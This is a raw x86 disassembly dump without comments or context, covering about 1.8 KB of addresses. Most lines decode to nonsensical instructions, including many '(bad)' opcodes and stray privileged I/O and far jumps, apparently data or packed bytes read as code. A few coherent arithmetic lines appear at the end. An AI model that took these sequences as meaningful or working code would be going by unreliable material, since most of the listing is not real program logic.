  41cf6f:	outs   dx,WORD PTR ds:[esi]
  41cf71:	xchg   esi,eax
  41cf72:	ret    
  41cf73:	adc    al,0x0
  41cf75:	dec    ebp
  41cf76:	cmp    eax,0x8dddda0e
  41cf7b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf7d:	add    ebp,ebp
  41cf7f:	cdq    
  41cf80:	shl    ebp,cl
  41cf82:	stos   BYTE PTR es:[edi],al
  41cf83:	pop    es
  41cf84:	dec    esi
  41cf85:	inc    ebp
  41cf86:	or     al,0xa4
  41cf88:	jp     0x41cfeb
  41cf8a:	xchg   ebp,eax
  41cf8b:	dec    edi
  41cf8c:	mov    WORD PTR [ebp*4-0x64f4b5e4],ds
  41cf93:	addr16 aam 0xf4
  41cf96:	lds    eax,FWORD PTR [ebx]
  41cf98:	or     BYTE PTR [ebp-0x635bd40],bh
  41cf9e:	push   ebp
  41cf9f:	mov    ebp,0x2fa26d0b
  41cfa4:	xor    DWORD PTR ds:0x393e91f0,esp
  41cfaa:	cmp    al,0x78
  41cfac:	call   0xf01af638
  41cfb1:	rcr    BYTE PTR ds:0x66a07964,cl
  41cfb7:	int    0x12
  41cfb9:	or     edi,edx
  41cfbb:	cmp    ebx,DWORD PTR [esi+ecx*2+0x63]
  41cfbf:	pop    ebp
  41cfc0:	mov    dl,ah
  41cfc2:	jge    0x41cf4f
  41cfc4:	jmp    0x46791fd6
  41cfc9:	jmp    0x578c:0xbe1ded4d
  41cfd0:	cmp    BYTE PTR [ebp+0x38],cl
  41cfd3:	cmp    BYTE PTR ds:0x205f3f3,cl
  41cfd9:	pop    esi
  41cfda:	ins    BYTE PTR es:[edi],dx
  41cfdb:	inc    esp
  41cfdc:	xor    eax,0xa3db538b
  41cfe1:	bound  edi,QWORD PTR [ebp-0x5b]
  41cfe4:	jnp    0x41d065
  41cfe6:	pop    ecx
  41cfe7:	in     eax,dx
  41cfe8:	fst    QWORD PTR [edx+ebx*1-0x6]
  41cfec:	mov    al,0xe4
  41cfee:	push   ss
  41cfef:	pusha  
  41cff0:	mov    bl,0x9b
  41cff2:	jle    0x41d066
  41cff4:	addr16 out 0xda,eax
  41cff7:	gs inc edi
  41cff9:	pop    ebp
  41cffa:	or     eax,DWORD PTR [esi+0x3069e9ca]
  41d000:	sbb    DWORD PTR [eax],ecx
  41d002:	mov    al,0xc1
  41d004:	add    DWORD PTR [eax],ebp
  41d006:	arpl   di,dx
  41d008:	stos   BYTE PTR es:[edi],al
  41d009:	sbb    ch,cl
  41d00b:	ins    BYTE PTR es:[edi],dx
  41d00c:	mov    esi,ebp
  41d00e:	(bad)  
  41d010:	in     al,0xa2
  41d012:	adc    edi,esi
  41d014:	popa   
  41d015:	or     BYTE PTR [esi+eax*4],0x48
  41d019:	sbb    DWORD PTR [edi-0x58c54c58],edx
  41d01f:	cmc    
  41d020:	lahf   
  41d021:	or     BYTE PTR [ecx+edi*4+0x57824095],bl
  41d028:	mov    bh,0xe8
  41d02a:	dec    ebp
  41d02b:	out    0xd5,al
  41d02d:	mov    esi,0x7cf9cc26
  41d032:	inc    esi
  41d033:	cli    
  41d034:	imul   esi,DWORD PTR [ecx+0x15e181fa],0xffffffcc
  41d03b:	sbb    ebx,DWORD PTR [edi]
  41d03d:	adc    ebx,ebx
  41d03f:	mov    al,0x65
  41d041:	or     BYTE PTR [eax-0x185f41cf],al
  41d047:	adc    cl,ah
  41d049:	sbb    ebx,DWORD PTR [ebx-0x4c]
  41d04c:	outs   dx,DWORD PTR ds:[esi]
  41d04d:	das    
  41d04e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d04f:	inc    ecx
  41d050:	(bad)  
  41d051:	fnsetpm(287 only) 
  41d053:	push   cs
  41d054:	(bad)  
  41d055:	call   0xd6c7e28a
  41d05a:	add    al,0x35
  41d05c:	in     eax,dx
  41d05d:	jl     0x41d0d5
  41d05f:	bnd jg 0x41cff9
  41d062:	cmove  eax,DWORD PTR [ecx]
  41d065:	scas   al,BYTE PTR es:[edi]
  41d066:	and    ebx,DWORD PTR ds:0x4e5556d9
  41d06c:	dec    esi
  41d06d:	xor    BYTE PTR [ecx],bh
  41d06f:	jle    0x41d094
  41d071:	add    eax,0x37e339cc
  41d076:	mov    esp,0x878fd33f
  41d07b:	sub    ah,BYTE PTR [ecx-0x746d1d62]
  41d081:	pop    ebx
  41d082:	xor    al,0x4b
  41d084:	repnz mov dh,BYTE PTR [esi]
  41d087:	xchg   esi,eax
  41d088:	out    dx,eax
  41d089:	cmp    ebx,DWORD PTR [ecx+0x2b8537c7]
  41d08f:	in     eax,dx
  41d090:	xor    dl,ch
  41d092:	cmc    
  41d093:	and    al,dh
  41d095:	inc    BYTE PTR [esi+0x55a696d5]
  41d09b:	inc    ecx
  41d09c:	scas   eax,DWORD PTR es:[edi]
  41d09d:	sti    
  41d09e:	sbb    al,0x61
  41d0a0:	clc    
  41d0a1:	jns    0x41d0ed
  41d0a3:	xchg   ebp,eax
  41d0a4:	cmp    DWORD PTR [ecx-0x44],esi
  41d0a7:	inc    edx
  41d0a8:	int3   
  41d0a9:	into   
  41d0aa:	cwde   
  41d0ab:	sbb    DWORD PTR [ebp+0x55a2836d],edi
  41d0b1:	xlat   BYTE PTR ds:[ebx]
  41d0b2:	out    dx,eax
  41d0b3:	mov    DWORD PTR [ecx+0x58],esi
  41d0b6:	cmp    ah,cl
  41d0b8:	xor    BYTE PTR gs:[ebp+0x568a6c79],cl
  41d0bf:	outs   dx,DWORD PTR ds:[esi]
  41d0c0:	call   0xb9c5:0x99f1d71f
  41d0c7:	test   DWORD PTR [edi],esp
  41d0c9:	ds jmp 0x97525d11
  41d0cf:	sub    BYTE PTR [ebx],ch
  41d0d1:	arpl   WORD PTR [ebp-0xc0219bb],cx
  41d0d7:	ja     0x41d112
  41d0d9:	mov    cl,0xcc
  41d0db:	repz repnz nop
  41d0de:	cld    
  41d0df:	test   eax,0x942e24ed
  41d0e4:	mov    esi,0x6a0e36a7
  41d0e9:	mov    edi,ebp
  41d0eb:	jle    0x41d143
  41d0ed:	cmp    DWORD PTR [ecx+0x50],ebx
  41d0f0:	int3   
  41d0f1:	idiv   BYTE PTR [edi-0x12]
  41d0f4:	hlt    
  41d0f5:	inc    esp
  41d0f6:	adc    al,0x64
  41d0f8:	jmp    0x41d148
  41d0fa:	push   ecx
  41d0fb:	ret    0xad8c
  41d0fe:	cmp    eax,DWORD PTR [edx]
  41d100:	je     0x41d0d8
  41d102:	clc    
  41d103:	pop    ebp
  41d104:	or     esp,DWORD PTR [eax+eiz*2]
  41d107:	fucom  st(5)
  41d109:	out    dx,eax
  41d10a:	lods   eax,DWORD PTR ds:[esi]
  41d10b:	fsub   DWORD PTR [edi]
  41d10d:	icebp  
  41d10e:	push   0xffffffa6
  41d110:	mov    eax,0xafaca445
  41d115:	lea    ebx,[esi-0x78]
  41d118:	out    dx,eax
  41d119:	dec    ebp
  41d11b:	xchg   ebx,eax
  41d11c:	jbe    0x41d0ad
  41d11e:	push   edi
  41d11f:	adc    al,BYTE PTR [ecx+0x12]
  41d122:	push   ds
  41d123:	xchg   ebp,eax
  41d124:	add    eax,0x978c3934
  41d129:	rcr    esp,1
  41d12b:	mov    al,ds:0x7610cac0
  41d130:	dec    edx
  41d131:	jmp    0xca3fbf0c
  41d136:	pop    ecx
  41d137:	inc    DWORD PTR [edx+0x2c5daa52]
  41d13d:	mov    esp,0xd9daf0b5
  41d142:	loop   0x41d150
  41d144:	sub    eax,DWORD PTR [ebp-0x7e]
  41d147:	xchg   edi,eax
  41d148:	pop    eax
  41d149:	jnp    0x41d0e7
  41d14b:	or     eax,0x1e50ef8a
  41d150:	push   esp
  41d151:	push   0xffffff9e
  41d153:	(bad)  
  41d154:	addr16 jg 0x41d102
  41d157:	jns    0x41d0ea
  41d159:	or     DWORD PTR [edi-0xe],esi
  41d15c:	lahf   
  41d15d:	nop
  41d15e:	sub    bl,dl
  41d160:	jp     0x41d186
  41d162:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d163:	pop    edi
  41d164:	xchg   esp,eax
  41d165:	mov    esp,0xb225a9a8
  41d16a:	mov    edx,0x86050010
  41d16f:	loop   0x41d1a1
  41d171:	outs   dx,DWORD PTR ds:[esi]
  41d172:	cwde   
  41d173:	pop    ebx
  41d174:	sub    DWORD PTR [ecx],ecx
  41d176:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d177:	cmp    eax,DWORD PTR [ebx-0x7ecf31ec]
  41d17d:	ds ds mov bh,0xef
  41d181:	stos   BYTE PTR es:[edi],al
  41d182:	mov    ah,0xca
  41d184:	push   ebp
  41d185:	outs   dx,BYTE PTR ds:[esi]
  41d186:	ret    
  41d187:	repnz dec edx
  41d189:	lea    ecx,[edi+0x6ce4aeba]
  41d18f:	cmp    eax,0x8ecf47e0
  41d194:	mov    ds,WORD PTR [ecx+0x13]
  41d197:	sub    ah,BYTE PTR [ecx+0x3a617b0f]
  41d19d:	xor    al,0xd0
  41d19f:	xchg   ebp,eax
  41d1a0:	stc    
  41d1a1:	ja     0x41d123
  41d1a3:	mov    ecx,?
  41d1a5:	xor    bl,BYTE PTR [edi+0x5ab336a8]
  41d1ab:	jns    0x41d18b
  41d1ad:	aas    
  41d1ae:	sub    eax,0xd8270647
  41d1b3:	pop    ax
  41d1b5:	sub    eax,0xd7c3d353
  41d1ba:	icebp  
  41d1bb:	dec    ecx
  41d1bc:	push   ds
  41d1bd:	push   0x3714f9ea
  41d1c2:	jmp    0x41d1a8
  41d1c4:	mov    ebp,0xbae6b580
  41d1c9:	lds    esi,FWORD PTR [ecx-0x7e]
  41d1cc:	aam    0xda
  41d1ce:	jl     0x41d21e
  41d1d0:	(bad)
  41d1d4:	stc    
  41d1d5:	popf   
  41d1d6:	retf   0x572e
  41d1d9:	mov    ch,0xe1
  41d1db:	shl    esp,1
  41d1dd:	stc    
  41d1de:	jae    0x41d20b
  41d1e0:	sbb    BYTE PTR [eax-0x4c150d07],dl
  41d1e6:	mov    dh,0xaa
  41d1e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1e9:	in     al,0xcf
  41d1eb:	jl     0x41d1fa
  41d1ed:	cmp    edx,DWORD PTR [ebx+0x16]
  41d1f0:	and    eax,0xb0bb741e
  41d1f5:	sub    eax,0x15680b79
  41d1fa:	or     DWORD PTR [esi],edi
  41d1fc:	add    BYTE PTR [edi],0xd5
  41d1ff:	and    al,0xfc
  41d201:	inc    esp
  41d202:	push   eax
  41d203:	leave  
  41d204:	idiv   DWORD PTR [esi+0x7d2f7566]
  41d20a:	das    
  41d20b:	dec    edi
  41d20c:	dec    edi
  41d20d:	inc    ebp
  41d20e:	jl     0x41d1a5
  41d210:	add    al,0x41
  41d212:	rcr    BYTE PTR [esp+ecx*8+0x4800859d],cl
  41d219:	jg     0x41d25d
  41d21b:	les    edx,FWORD PTR [ebx+eax*2+0x7d5ec93a]
  41d222:	xor    eax,0xf4ccbf1b
  41d227:	push   ebp
  41d228:	je     0x41d258
  41d22a:	mov    esi,0xf8e5064e
  41d22f:	imul   edx,DWORD PTR [esi+eiz*8-0x3bb2df83],0xccce445d
  41d23a:	shl    dl,1
  41d23c:	(bad)  
  41d23d:	adc    al,0xae
  41d23f:	dec    ebp
  41d240:	test   al,0x6a
  41d242:	mov    ah,0x83
  41d244:	xchg   bh,bh
  41d246:	jp     0x41d24d
  41d248:	adc    al,0x84
  41d24a:	mov    DWORD PTR [esp+ebx*4-0x5f267e6a],edi
  41d251:	in     eax,0x1e
  41d253:	jnp    0x41d2ac
  41d255:	xchg   ecx,eax
  41d256:	pop    ds
  41d257:	leave  
  41d258:	imul   esi,DWORD PTR [edx],0xffffff83
  41d25b:	into   
  41d25c:	es xchg edi,eax
  41d25e:	enter  0x83f6,0xf2
  41d262:	xchg   BYTE PTR [esi],ch
  41d264:	addr16 retf 0x4010
  41d268:	push   0x17f47f61
  41d26d:	or     esi,DWORD PTR [eax+esi*4+0x73]
  41d271:	(bad)  
  41d273:	push   cs
  41d274:	mov    eax,ds:0xe60696b
  41d279:	inc    ecx
  41d27a:	mov    ah,0xe0
  41d27c:	ret    0x8db2
  41d27f:	ss inc ecx
  41d281:	cmc    
  41d282:	add    BYTE PTR [edi],0xc
  41d285:	mov    ds:0x457a98fc,eax
  41d28a:	outs   dx,BYTE PTR ds:[esi]
  41d28b:	mov    ds:0x21cdbf2d,eax
  41d290:	stc    
  41d291:	and    esi,DWORD PTR ds:0xb41b111b
  41d297:	and    bh,BYTE PTR ds:0x1cca6ea7
  41d29d:	sub    eax,0x9cfd8ab7
  41d2a2:	fisubr WORD PTR [edi]
  41d2a4:	jl     0x41d320
  41d2a6:	xchg   ecx,eax
  41d2a7:	mov    edx,0xefd731d3
  41d2ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2ad:	fisubr DWORD PTR [edx]
  41d2af:	adc    dh,0x9a
  41d2b2:	pop    ebx
  41d2b3:	jmp    0x2339:0xa4497c20
  41d2ba:	test   DWORD PTR [esp+edi*4-0x7c],ebp
  41d2be:	scas   al,BYTE PTR es:[edi]
  41d2bf:	xor    eax,ebp
  41d2c1:	add    DWORD PTR [eax],0x8851e86f
  41d2c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2c8:	xlat   BYTE PTR ds:[ebx]
  41d2c9:	dec    edx
  41d2ca:	dec    esi
  41d2cb:	xor    eax,0x8abf1dff
  41d2d0:	loope  0x41d344
  41d2d2:	aas    
  41d2d3:	jecxz  0x41d2c3
  41d2d5:	mov    WORD PTR [ecx+0x36],cs
  41d2d8:	repz (bad) 
  41d2da:	and    BYTE PTR ds:0xf5ef53da,dh
  41d2e0:	xchg   BYTE PTR [eax-0x64],dh
  41d2e3:	sbb    DWORD PTR ds:0x6f61b415,edx
  41d2e9:	mov    WORD PTR [ebx+ecx*8],ds
  41d2ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d2ed:	mov    ch,BYTE PTR [ebx-0x6226cb2a]
  41d2f3:	loope  0x41d28b
  41d2f5:	inc    ebx
  41d2f6:	mov    BYTE PTR [edi-0x4247fd1a],0x7e
  41d2fd:	clc    
  41d2fe:	adc    edi,DWORD PTR [esp+ebp*2]
  41d301:	sub    BYTE PTR [ecx-0xa],0x61
  41d305:	push   si
  41d307:	sbb    eax,0xce822551
  41d30c:	jecxz  0x41d2c5
  41d30e:	(bad)  
  41d311:	loop   0x41d37c
  41d313:	push   ebx
  41d314:	(bad)  [edx+0x1803e294]
  41d31a:	xchg   esp,eax
  41d31b:	ret    0xc107
  41d31e:	pop    edi
  41d31f:	cwde   
  41d320:	add    DWORD PTR [ecx],esp
  41d322:	mov    ebx,0xfddd164
  41d327:	dec    ebx
  41d328:	ror    DWORD PTR [edi-0x66],0xa4
  41d32c:	ror    DWORD PTR [ebx+0x172cb89b],1
  41d332:	add    edi,DWORD PTR [ecx]
  41d334:	loope  0x41d2ed
  41d336:	dec    ebp
  41d337:	xor    DWORD PTR [ebp-0x5d],ebx
  41d33a:	mov    edx,0x22abab1
  41d33f:	cwde   
  41d340:	jle    0x41d322
  41d342:	lsl    ecx,di
  41d345:	ss enter 0xd33b,0x3
  41d34a:	out    dx,al
  41d34b:	out    dx,eax
  41d34c:	das    
  41d34d:	xchg   ecx,eax
  41d34e:	outs   dx,BYTE PTR ds:[esi]
  41d34f:	jno    0x41d3c1
  41d351:	push   ds
  41d352:	out    0x53,al
  41d354:	fs lahf 
  41d356:	fs test al,0x4
  41d359:	jo     0x41d331
  41d35b:	push   0x5f
  41d35d:	shl    BYTE PTR ds:0x8d55f581,cl
  41d363:	sti    
  41d364:	jns    0x41d3dd
  41d366:	fwait
  41d367:	sub    eax,0x527c7b15
  41d36c:	xor    DWORD PTR [edi],eax
  41d36e:	xchg   ecx,eax
  41d36f:	(bad)  
  41d370:	adc    eax,0x7988be0
  41d375:	ds add ah,al
  41d378:	shr    DWORD PTR [ebx-0xd2ac7eb],cl
  41d37e:	jmp    0x56818f7c
  41d383:	div    BYTE PTR [ecx+0x71]
  41d386:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d387:	inc    eax
  41d388:	push   ebx
  41d389:	aaa    
  41d38a:	ja     0x41d31e
  41d38c:	xor    al,0xe2
  41d38e:	(bad)  
  41d38f:	mov    ah,0xf
  41d391:	rcr    DWORD PTR [eax+esi*8-0x21],cl
  41d395:	sbb    edx,DWORD PTR [edi+eax*4-0x62]
  41d399:	or     edi,DWORD PTR [ebx]
  41d39b:	fmul   DWORD PTR ds:0x5802cb14
  41d3a1:	and    eax,0x5497e120
  41d3a6:	sti    
  41d3a7:	dec    esi
  41d3a8:	fbld   TBYTE PTR [edx-0x3d1a0d11]
  41d3ae:	mov    bh,0xe1
  41d3b0:	sbb    DWORD PTR ds:0x452edd94,esp
  41d3b6:	std    
  41d3b7:	mov    eax,0x7ce7c767
  41d3bc:	and    DWORD PTR [esi-0x4f],0xac223bb
  41d3c3:	aaa    
  41d3c4:	aam    0xc5
  41d3c6:	add    al,0x3d
  41d3c8:	sub    BYTE PTR [ebp-0x70],0xdb
  41d3cc:	jmp    0x7a07:0x4fbe7b89
  41d3d3:	stos   BYTE PTR es:[edi],al
  41d3d4:	push   ebx
  41d3d5:	repz pop es
  41d3d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3d8:	je     0x41d384
  41d3da:	mov    dl,ah
  41d3dc:	dec    ebp
  41d3dd:	cmp    DWORD PTR [edi-0xaf0b9f3],ebx
  41d3e3:	in     al,dx
  41d3e4:	mov    WORD PTR [ebp-0x40473a6e],?
  41d3ea:	push   ebx
  41d3eb:	pop    esp
  41d3ec:	lea    eax,[edx-0x61]
  41d3ef:	retf   
  41d3f0:	outs   dx,BYTE PTR ds:[esi]
  41d3f1:	mov    dh,0x8f
  41d3f3:	pop    es
  41d3f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3f5:	jo     0x41d43f
  41d3f7:	jns    0x41d474
  41d3f9:	or     BYTE PTR [ecx+0x5e],0xc6
  41d3fd:	adc    al,0x9b
  41d3ff:	lds    ebx,FWORD PTR [edx+ecx*4]
  41d402:	mov    ebp,0x66f10901
  41d407:	push   ds
  41d408:	loopne 0x41d478
  41d40a:	push   edi
  41d40b:	dec    eax
  41d40c:	rcr    DWORD PTR [edx],cl
  41d40e:	pop    ebp
  41d40f:	(bad)  
  41d410:	push   ebx
  41d411:	aas    
  41d412:	in     eax,dx
  41d413:	ins    DWORD PTR es:[edi],dx
  41d414:	in     eax,0x98
  41d416:	sub    dh,BYTE PTR [eax+0x1f65f5f9]
  41d41c:	mov    edx,0x6bf355b5
  41d421:	shl    ch,1
  41d423:	adc    DWORD PTR [edx-0x34dc2fe7],eax
  41d429:	mov    BYTE PTR [ecx+0x3c],ch
  41d42c:	mov    ah,0x99
  41d42e:	je     0x41d483
  41d430:	repnz fistp QWORD PTR [ebx+0x2a]
  41d434:	inc    eax
  41d435:	dec    eax
  41d436:	cmp    dh,BYTE PTR [esi]
  41d438:	rol    eax,1
  41d43a:	jae    0x41d4b5
  41d43c:	push   ecx
  41d43d:	jnp    0x41d47a
  41d43f:	sbb    DWORD PTR ds:0xa9a387db,edi
  41d445:	pop    esi
  41d446:	mov    DWORD PTR [ebx+edi*2-0x33],edx
  41d44a:	idiv   BYTE PTR [ebp-0x7a8f96e5]
  41d450:	into   
  41d451:	sbb    al,0x4e
  41d453:	push   ecx
  41d454:	mov    BYTE PTR [edi-0x7c676d09],al
  41d45a:	and    esp,DWORD PTR [ebx+0x64656f84]
  41d460:	loopne 0x41d41c
  41d462:	pop    edx
  41d463:	or     DWORD PTR [edi],0x9cc69d26
  41d469:	in     al,dx
  41d46a:	jge    0x41d3f7
  41d46c:	push   ebx
  41d46d:	bound  ecx,QWORD PTR [edi-0x80]
  41d470:	dec    esi
  41d471:	mov    ecx,0xcdcb70a9
  41d476:	fidivr DWORD PTR [esi+eiz*8]
  41d479:	repnz dec ecx
  41d47b:	mov    edi,0xff9a8b0f
  41d480:	ds mov esi,0xe940b461
  41d486:	sbb    bl,BYTE PTR [esi]
  41d488:	ins    BYTE PTR es:[edi],dx
  41d489:	lock jnp 0x41d489
  41d48c:	dec    ebx
  41d48d:	xor    bl,dh
  41d48f:	push   0x1c
  41d491:	mov    al,ds:0xaf1d91ba
  41d496:	add    eax,DWORD PTR [ebx]
  41d498:	xor    al,0xb9
  41d49a:	jns    0x41d461
  41d49c:	pop    edx
  41d49d:	test   DWORD PTR [ecx],eax
  41d49f:	xchg   ecx,eax
  41d4a0:	lods   eax,DWORD PTR ds:[esi]
  41d4a1:	not    DWORD PTR [ecx]
  41d4a3:	iret   
  41d4a4:	adc    eax,0x34d5fce
  41d4a9:	push   ebx
  41d4aa:	xor    eax,0x258c938e
  41d4af:	jmp    0x41d4d7
  41d4b1:	neg    BYTE PTR [esp+eiz*2]
  41d4b4:	loop   0x41d522
  41d4b6:	inc    edi
  41d4b7:	(bad)  
  41d4b8:	cld    
  41d4b9:	mov    ebp,0xc960ef1a
  41d4be:	xor    eax,0x7b1f294b
  41d4c3:	dec    ecx
  41d4c4:	mov    ds:0x6429261c,al
  41d4c9:	xor    eax,0x664ab421
  41d4ce:	and    eax,0x2a7b0566
  41d4d3:	xor    BYTE PTR [ebx-0x21f3e185],ah
  41d4d9:	dec    esi
  41d4da:	sbb    eax,0xba062c39
  41d4df:	mov    esp,0x310fc644
  41d4e4:	ss push edi
  41d4e6:	add    DWORD PTR [edx-0x6d193e2c],esp
  41d4ec:	in     al,0x24
  41d4ee:	cld    
  41d4ef:	push   ss
  41d4f0:	imul   DWORD PTR [edx+0x2e836108]
  41d4f6:	ret    0x3187
  41d4f9:	sub    al,0x40
  41d4fb:	cmp    cl,BYTE PTR [edi+ebx*1]
  41d4fe:	sbb    DWORD PTR [edx-0x47b007c5],ecx
  41d504:	push   cs
  41d505:	loopne 0x41d543
  41d507:	pop    edx
  41d508:	push   cs
  41d509:	mov    edx,0xbcbf2d90
  41d50e:	aaa    
  41d50f:	or     DWORD PTR ds:0xa3df6e91,edx
  41d515:	jp     0x41d571
  41d517:	jb     0x41d4c7
  41d519:	fs jo  0x41d505
  41d51c:	dec    eax
  41d51d:	dec    esi
  41d51e:	rol    bl,1
  41d520:	das    
  41d521:	or     cl,BYTE PTR [edx+eax*8]
  41d524:	lods   eax,DWORD PTR ds:[esi]
  41d525:	enter  0x28b5,0x6d
  41d529:	mov    dl,0x9
  41d52b:	or     dh,BYTE PTR [ebx]
  41d52d:	lods   eax,DWORD PTR ds:[esi]
  41d52e:	test   DWORD PTR [edi+0x16],ecx
  41d531:	pop    ebx
  41d532:	es gs or edi,DWORD PTR gs:[ecx+ebp*8]
  41d538:	(bad)  
  41d53a:	pop    ecx
  41d53b:	push   ecx
  41d53c:	ret    
  41d53d:	adc    al,0x64
  41d53f:	adc    eax,0xaf04ff06
  41d544:	repz xor ch,BYTE PTR [esi+0x34]
  41d548:	pop    edx
  41d549:	(bad)  
  41d54a:	call   0xe829952e
  41d54f:	pop    edi
  41d550:	or     DWORD PTR [edx],eax
  41d552:	retf   
  41d553:	xor    eax,0xddae492f
  41d558:	jmp    0x4c0c:0xc08fbdb1
  41d55f:	lahf   
  41d560:	cmp    eax,0x79d66920
  41d565:	cmp    ch,BYTE PTR [edi]
  41d567:	loop   0x41d5c0
  41d569:	sbb    eax,0x7b69fe81
  41d56e:	adc    al,0x53
  41d570:	rol    BYTE PTR [eax],0x61
  41d573:	ja     0x41d5e0
  41d575:	cs inc ebx
  41d577:	test   BYTE PTR [eax+0x53],bl
  41d57a:	cmp    eax,esp
  41d57c:	inc    ebp
  41d57d:	jl     0x41d538
  41d57f:	icebp  
  41d580:	xchg   edx,eax
  41d581:	(bad)  
  41d582:	out    dx,al
  41d583:	dec    ebp
  41d584:	pushf  
  41d585:	repz ret 
  41d587:	test   DWORD PTR [ebx],esi
  41d589:	mov    bl,BYTE PTR [eax]
  41d58b:	pop    edx
  41d58c:	pop    edi
  41d58d:	aad    0x9d
  41d58f:	rcr    DWORD PTR [eax],1
  41d591:	xchg   ch,ah
  41d593:	stos   BYTE PTR es:[edi],al
  41d594:	mov    esp,0x4de56405
  41d599:	leave  
  41d59a:	popf   
  41d59b:	lods   eax,DWORD PTR ds:[esi]
  41d59c:	and    al,0x4a
  41d59e:	mov    bh,0xb0
  41d5a0:	ret    
  41d5a1:	adc    ch,BYTE PTR ds:0xa0a7f0c6
  41d5a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d5a8:	jle    0x41d52f
  41d5aa:	popf   
  41d5ab:	in     al,0xa0
  41d5ad:	mov    cl,0xc
  41d5af:	jecxz  0x41d62e
  41d5b1:	out    dx,al
  41d5b2:	pop    ecx
  41d5b3:	loope  0x41d5c2
  41d5b5:	pop    ecx
  41d5b6:	mov    ah,BYTE PTR [ebx-0x4e]
  41d5b9:	and    dh,BYTE PTR [edx+0x71a8a5ac]
  41d5bf:	(bad)  
  41d5c0:	ss jno 0x41d548
  41d5c3:	fcomp  QWORD PTR [edx+esi*1+0x1a]
  41d5c7:	je     0x41d61e
  41d5c9:	sar    BYTE PTR [ecx],0xfa
  41d5cc:	jne    0x41d5bb
  41d5ce:	std    
  41d5cf:	pushf  
  41d5d0:	and    al,0x8b
  41d5d2:	cld    
  41d5d3:	data16 repz (bad) 
  41d5d6:	fs xchg edx,ebx
  41d5d9:	out    0x9e,al
  41d5db:	pop    ebx
  41d5dc:	dec    ebx
  41d5dd:	shl    al,1
  41d5df:	(bad)  
  41d5e0:	pop    esp
  41d5e1:	mov    dl,0x16
  41d5e3:	mov    esi,DWORD PTR [eax]
  41d5e5:	stos   BYTE PTR es:[edi],al
  41d5e6:	push   es
  41d5e7:	ret    0x5055
  41d5ea:	daa    
  41d5eb:	inc    ebp
  41d5ec:	sub    DWORD PTR [ebp+0x163b57f7],edi
  41d5f2:	jl     0x41d5e2
  41d5f4:	(bad)  
  41d5f5:	ja     0x41d655
  41d5f7:	fcom   DWORD PTR [esi-0x56]
  41d5fa:	repz and dh,ch
  41d5fd:	in     al,0xa
  41d5ff:	sahf   
  41d600:	cmp    BYTE PTR [eax+0x1bf4c43a],dh
  41d606:	mov    BYTE PTR [esi+0x2ee8f044],ah
  41d60c:	cmp    al,0xbd
  41d60e:	sbb    eax,0xf8436d62
  41d613:	(bad)  
  41d615:	dec    esi
  41d616:	pushf  
  41d617:	daa    
  41d618:	mov    ch,0x87
  41d61a:	push   ecx
  41d61b:	jb     0x41d66d
  41d61d:	cwde   
  41d61e:	add    BYTE PTR [eax],dl
  41d620:	mov    ah,0x53
  41d622:	test   DWORD PTR [edi-0x45],0x8d1166bc
  41d629:	les    esi,FWORD PTR [eax-0x73]
  41d62c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d62d:	(bad)  
  41d62e:	popa   
  41d62f:	pop    ss
  41d630:	in     al,dx
  41d631:	pop    ds
  41d632:	adc    DWORD PTR [ebx+edx*1+0x6034cb2b],ebx
  41d639:	mov    ah,0x25
  41d63b:	popa   
  41d63c:	retf   
  41d63d:	dec    DWORD PTR [eax+ebp*2]
  41d640:	adc    DWORD PTR [ebp+eiz*1+0x514f9dcc],esp
  41d647:	jbe    0x41d68b
  41d649:	jne    0x41d5e2
  41d64b:	add    edx,DWORD PTR [ecx-0x6e3a58e6]
  41d651:	sbb    ecx,ebx
  41d653:	not    dl
  41d655:	mov    dh,0x45
  41d657:	mov    ebx,0xee220a6d
  41d65c:	fcomip st,st(0)
  41d65e:	aas    
  41d65f:	pusha  
  41d660:	inc    esp
  41d661:	jle    0x41d6a7
  41d663:	inc    eax
  41d664:	cli    
  41d665:	in     eax,dx
  41d666:	shl    DWORD PTR [edx+ebp*1],cl
  41d669:	sbb    DWORD PTR [edx],0x70
  41d66c:	add    al,0x15
  41d66e:	test   eax,0xad7581c7
  41d673:	sbb    DWORD PTR [ecx-0x56dbf9ae],eax
  41d679:	jae    0x41d65a
  41d67b:	and    DWORD PTR [esi],0x40
  41d67e:	dec    ecx
  41d67f:	sbb    BYTE PTR [esi],ch
  41d681:	push   ecx
  41d682:	push   edi
  41d683:	cld    
  41d684:	aas    
  41d685:	lahf   
  41d686:	in     eax,0xe4
  41d688:	stos   BYTE PTR es:[edi],al
  41d689:	and    esi,ecx
  41d68b:	hlt    
  41d68c:	add    edx,0x5708f1
  41d692:	imul   edx,ebx
  41d695:	mov    DWORD PTR [ebp-0x58],edx
  41d698:	mov    edx,DWORD PTR [ebp+0x8]
  41d69b:	mov    ebx,DWORD PTR [ebp-0x54]
  41d69e:	add    edx,0x64f893
  41d6a4:	or     edx,ebx
  41d6a6:	mov    DWORD PTR [ebp-0x54],edx
  41d6a9:	mov    edx,DWORD PTR [ebp+0x8]
  41d6ac:	mov    ebx,DWORD PTR [ebp-0x50]
  41d6af:	add    edx,ecx
  41d6b1:	xor    edx,ebx
  41d6b3:	mov    DWORD PTR [ebp-0x50],edx
  41d6b6:	mov    edx,DWORD PTR [ebp+0x8]
  41d6b9:	mov    ebx,DWORD PTR [ebp-0x4c]
  41d6bc:	add    edx,edi
  41d6be:	and    edx,ebx
  41d6c0:	mov    DWORD PTR [ebp-0x4c],edx
  41d6c3:	mov    edx,DWORD PTR [ebp+0x8]
  41d6c6:	mov    ebx,DWORD PTR [ebp-0x48]
  41d6c9:	lea    edx,[ebx+edx*1+0x241fcde]
  41d6d0:	mov    DWORD PTR [ebp-0x48],edx
